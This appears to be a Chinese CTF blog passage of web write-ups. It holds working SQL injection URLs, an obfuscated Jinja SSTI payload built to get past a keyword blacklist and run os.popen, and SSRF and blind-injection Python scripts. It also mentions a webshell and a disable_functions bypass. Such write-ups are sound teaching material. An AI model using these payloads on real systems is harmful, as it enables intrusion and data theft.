<p><img src="https://www.hualigs.cn/image/607146b00fce8.jpg"></p>
<p>成功写入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;70366b0f-3c41-4ddb-8e92-2f4fae6b1b2e.node3.buuoj.cn&#x2F;runtime&#x2F;session&#x2F;sess_aaaabbbbccccddddeeeeffff1234.php</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607146b09f419.jpg"></p>
<p>蚁剑连接后发现flag为空，根目录存在readflag文件，需要执行readflag</p>
<p><img src="https://www.hualigs.cn/image/607146b004f5f.jpg"></p>
<p>发现disable_function过滤命令执行函数</p>
<p><img src="https://www.hualigs.cn/image/607146ace2ccf.jpg"></p>
<p>使用蚁剑绕过disable_function插件读取flag</p>
<p><img src="https://www.hualigs.cn/image/607149d41c4f8.jpg"></p>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="http://hed9eh0g.top/?p=280">http://hed9eh0g.top/?p=280</a></p>
<p><a target="_blank" rel="noopener" href="https://www.smi1e.top/thinkphp6-0-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9e/">https://www.smi1e.top/thinkphp6-0-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5%e6%bc%8f%e6%b4%9e/</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1114/">https://paper.seebug.org/1114/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8546">https://xz.aliyun.com/t/8546</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-08T05:12:57.000Z" title="2021-04-08T05:12:57.000Z">2021-04-08</time>发表</span><span class="level-item"><time dateTime="2021-04-08T05:22:02.334Z" title="2021-04-08T05:22:02.334Z">2021-04-08</time>更新</span><span class="level-item">11 分钟读完 (大约1715个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/08/2021-DASCTF%E4%B8%89%E6%9C%88%E8%B5%9Bweb%E6%80%BB%E7%BB%93/">2021 DASCTF三月赛web总结</a></h1><div class="content"><h1 id="BestDB"><a href="#BestDB" class="headerlink" title="BestDB"></a>BestDB</h1><p>union注入</p>
<p>开始就提示了sql语句，单引号和空格被过滤，双引号闭合即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;SELECT * FROM users WHERE id &#x3D; &#39;$query&#39; OR username &#x3D; \&quot;$query\&quot;&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/cx91B7bO8SjqKYJ.png" alt="image-20210406122623737.png"></p>
<p>读取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10005&#x2F;?query&#x3D;asd&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),3%23</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/YIagPrL1ysVqfHd.png" alt="image-20210406122601658.png"></p>
<p>读取列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10005&#x2F;?query&#x3D;asd&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&quot;f1agdas&quot;),3%23</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/e7LIlZFmbTM6XtY.png" alt="image-20210406122733420.png"></p>
<p>读取f1agdas，得知flag在flag.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10005&#x2F;?query&#x3D;asd%22&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(f1agdas)&#x2F;**&#x2F;from&#x2F;**&#x2F;f1agdas),3%23</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/CZ3cdwuoJ8aHbh5.png" alt="image-20210406123644931.png"></p>
<p>使用load_File读取文件，flag.txt被过滤，改为hex编码即可绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10005&#x2F;?query&#x3D;asd&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;hex(load_file(0x2F666C61672E747874))),3%23</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/cm2gwbz6ltQ3M5x.png" alt="image-20210406123147212.png"></p>
<p>解码后得到flag，DASCTF{352f1504696639a0d71c2d36591d505b}</p>
<p><img src="https://i.loli.net/2021/04/08/nMZIXqO9zm2Kobh.png" alt="image-20210406123303737.png"></p>
<h1 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h1><p>ssti，源码中给出了黑名单，可以使用join过滤器和unicode数字绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">Hi young boy!&lt;&#x2F;br&gt;</span><br><span class="line">Do you like ssti?&lt;&#x2F;br&gt;</span><br><span class="line"></span><br><span class="line">blacklist&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;count&#39;,&#39;length&#39;,&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;&#x2F;br&gt;    </span><br><span class="line">&lt;&#x2F;br&gt;   </span><br><span class="line"></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125; # pop</span><br><span class="line">&#123;%set b&#x3D;lipsum|string|list|attr(a)(𝟙𝟠)%&#125; # _</span><br><span class="line">&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125; # globals</span><br><span class="line">&#123;%set d&#x3D;(b,b,dict(ge&#x3D;cc,tit&#x3D;dd,em&#x3D;aa)|join,b,b)|join%&#125; # getitem</span><br><span class="line">&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125; # os</span><br><span class="line">&#123;%set f&#x3D;lipsum|string|list|attr(a)(𝟡)%&#125; # 空格</span><br><span class="line">&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125; # 斜杠</span><br><span class="line">&#123;%set i&#x3D;(dict(cat&#x3D;aa)|join,f,g,dict(flag&#x3D;aa)|join)|join%&#125; # cat &#x2F;flag</span><br><span class="line">&#123;%set h&#x3D;(a,dict(en&#x3D;aa)|join|join)|join%&#125; # popen</span><br><span class="line">&#123;%set i&#x3D;dict(re&#x3D;aa,ad&#x3D;aa)|join%&#125; # read</span><br><span class="line">&#123;%set z&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125; #点</span><br><span class="line">&#123;%set j&#x3D;(dict(ls&#x3D;aa)|join,f,g,(dict(var&#x3D;aa)|join),g,(dict(www&#x3D;aa)|join),g,(dict(flask&#x3D;aa)|join)|join)|join%&#125; #ls &#x2F;var&#x2F;www&#x2F;flask</span><br><span class="line">&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;</span><br><span class="line">#最后拼接起来</span><br><span class="line">#&#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;ls &#x2F;var&#x2F;www&#x2F;flask&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;&#123;%set b&#x3D;lipsum|string|list|attr(a)(𝟙𝟠)%&#125;&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125;&#123;%set d&#x3D;(b,b,dict(ge&#x3D;cc,tit&#x3D;dd,em&#x3D;aa)|join,b,b)|join%&#125;&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125;&#123;%set f&#x3D;lipsum|string|list|attr(a)(𝟡)%&#125;&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125;&#123;%set i&#x3D;(dict(cat&#x3D;aa)|join,f,g,dict(flag&#x3D;aa)|join)|join%&#125;&#123;%set h&#x3D;(a,dict(en&#x3D;aa)|join|join)|join%&#125;&#123;%set i&#x3D;dict(re&#x3D;aa,ad&#x3D;aa)|join%&#125;&#123;%set z&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125;&#123;%set j&#x3D;(dict(ls&#x3D;aa)|join,f,g,(dict(var&#x3D;aa)|join),g,(dict(www&#x3D;aa)|join),g,(dict(flask&#x3D;aa)|join)|join)|join%&#125;&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/y2qaIMUh7VASDQc.png" alt="image-20210408130137429.png"></p>
<h1 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a>ez_login</h1><p>index.php，开始的session可以使用session.upload_progress绕过</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p>
<p><img src="https://i.loli.net/2021/04/08/A4FQCeun9IYcKJT.png" alt="image-20210406214427556.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no session&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(check_inner_ip(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$url</span>)&#123;</span><br><span class="line">            <span class="variable">$ch</span> = curl_init();</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION,<span class="number">1</span>);</span><br><span class="line">            <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">            curl_close(<span class="variable">$ch</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your IP is internal yoyoyo&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>发现目录下存在admin.php，必须要本地访问</p>
<p><img src="https://i.loli.net/2021/04/08/SKuT3lwEdmsrbyq.png" alt="image-20210406214347962.png"></p>
<p>构造ssrf请求admin.php</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://183.129.189.60:10015/?url=http://localhost/admin.php&quot;</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">session = requests.session()</span><br><span class="line">resp = session.post(url,data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;x&#x27;</span>&#125;,files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2021/04/08/ux6jz81kNdUnWyA.png" alt="image-20210406214205226.png"></p>
<p>发现两个文件login_admin.php，/yuanma_f0r_eAZy_logon.zip</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;	</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Admin Login&lt;/title&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;application/x-javascript&quot;</span>&gt; addEventListener(<span class="string">&quot;load&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; setTimeout(hideURLbar, <span class="number">0</span>); &#125;, <span class="literal">false</span>); <span class="function"><span class="keyword">function</span> <span class="title">hideURLbar</span>(<span class="params"></span>)</span>&#123; window.scrollTo(<span class="number">0</span>,<span class="number">1</span>); &#125; &lt;/script&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;keywords&quot;</span> content=<span class="string">&quot;Flat Dark Web Login Form Responsive Templates, Iphone Widget Template, Smartphone login forms,Login form, Widget Template, Responsive Templates, a Ipad 404 Templates, Flat Responsive Templates&quot;</span> /&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> /&gt;</span><br><span class="line">&lt;!--/yuanma_f0r_eAZy_logon.zip--&gt;</span><br><span class="line">&lt;!--webfonts--&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;http://fonts.useso.com/css?family=PT+Sans:400,700,400italic,700italic|Oswald:400,300,700&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;http://fonts.useso.com/css?family=Exo+2&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;!--<span class="comment">//webfonts--&gt;</span></span><br><span class="line">&lt;script src=<span class="string">&quot;http://ajax.useso.com/ajax/libs/jquery/1.11.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;$(document).ready(<span class="function"><span class="keyword">function</span>(<span class="params">c</span>) </span>&#123;</span><br><span class="line">	$(<span class="string">&quot;.close&quot;</span>).on(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;</span><br><span class="line">		$(<span class="string">&quot;.login-form&quot;</span>).fadeOut(<span class="string">&quot;slow&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;</span><br><span class="line">	  		$(<span class="string">&quot;.login-form&quot;</span>).remove();</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;);	  </span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> &lt;!--SIGN UP--&gt;</span><br><span class="line"> &lt;h1&gt;Login&lt;/h1&gt;</span><br><span class="line">&lt;div class=&quot;login-form&quot;&gt;</span><br><span class="line">	&lt;div class=&quot;close&quot;&gt; &lt;/div&gt;</span><br><span class="line">		&lt;div class=&quot;head-info&quot;&gt;</span><br><span class="line">			&lt;label class=&quot;lbl-1&quot;&gt; &lt;/label&gt;</span><br><span class="line">			&lt;label class=&quot;lbl-2&quot;&gt; &lt;/label&gt;</span><br><span class="line">			&lt;label class=&quot;lbl-3&quot;&gt; &lt;/label&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">			&lt;div class=&quot;clear&quot;&gt; &lt;/div&gt;</span><br><span class="line">	&lt;div class=&quot;avtar&quot;&gt;</span><br><span class="line">		&lt;img src=<span class="string">&quot;images/avtar1.png&quot;</span> /&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">			&lt;form action=<span class="string">&quot;./login_admin.php&quot;</span>&gt;</span><br><span class="line">					&lt;input type=&quot;text&quot; class=&quot;text&quot; name=&quot;username&quot; value=&quot;Username&quot; onfocus=&quot;this.value = &quot;&quot;;&quot; onblur=&quot;if (this.value == &quot;&quot;) &#123;this.value = &quot;Username&quot;;&#125;&quot; &gt;</span><br><span class="line">						&lt;div class=&quot;key&quot;&gt;</span><br><span class="line">					&lt;input type=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;Password&quot;</span> name=<span class="string">&quot;password&quot;</span> onfocus=<span class="string">&quot;this.value = &quot;</span><span class="string">&quot;;&quot;</span> onblur=<span class="string">&quot;if (this.value == &quot;</span><span class="string">&quot;) &#123;this.value = &quot;</span>Password<span class="string">&quot;;&#125;&quot;</span>&gt;</span><br><span class="line">						&lt;/div&gt;</span><br><span class="line">			&lt;/form&gt;</span><br><span class="line">	&lt;div class=&quot;signin&quot;&gt;</span><br><span class="line">		&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Login&quot;</span> &gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"> &lt;div class=&quot;copy-rights&quot;&gt;</span><br><span class="line">					&lt;p&gt;Copyright &amp;copy; ez login aha?&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>yuanma_f0r_eAZy_logon.zip中包含一个se1f_Log3n.php</p>
<p><img src="https://i.loli.net/2021/04/08/z1fsyGHLReTZSup.png" alt="image-20210406214240038.png"></p>
<p>se1lf_Log3n.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/db.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> !== <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&#x27;SELECT `username`,`password` FROM `user` WHERE `username`= &quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; and `password`=&quot;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$con</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc() <span class="keyword">AND</span> <span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>)) <span class="keyword">OR</span> ( (<span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>) )); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>存在布尔盲注，构造注入语句后用ssrf请求即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10015&#x2F;?url&#x3D;http:&#x2F;&#x2F;localhost&#x2F;&#x2F;se1f_Log3n.php?username&#x3D;admin&#39;or 1&#x3D;1%23password&#x3D;admin</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">asc_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">mydata = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">myfile = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)&#125;</span><br><span class="line">mycookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;jtq4q3fdfgnckcrd52a6nhf90a&#x27;</span>&#125;</span><br><span class="line">ip = <span class="string">&#x27;http://183.129.189.60:10015/?url=&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ses=requests.session()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;http://localhost//se1f_Log3n.php?username=admin\&#x27;and 1=1%23password=admin&#x27;</span></span><br><span class="line">url = ip + quote(payload)</span><br><span class="line">r = ses.post(url=url, data=mydata, files=myfile, cookies=mycookie)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/08/v3xsRomFOT4pNMi.png" alt="image-20210408125333703.png"></p>
<p>and 1=1 and 1=2返回结果不同</p>
<p><img src="https://i.loli.net/2021/04/08/EU4xlF9ZoHLRSY8.png" alt="image-20210408125535401.png"></p>
<p>盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span 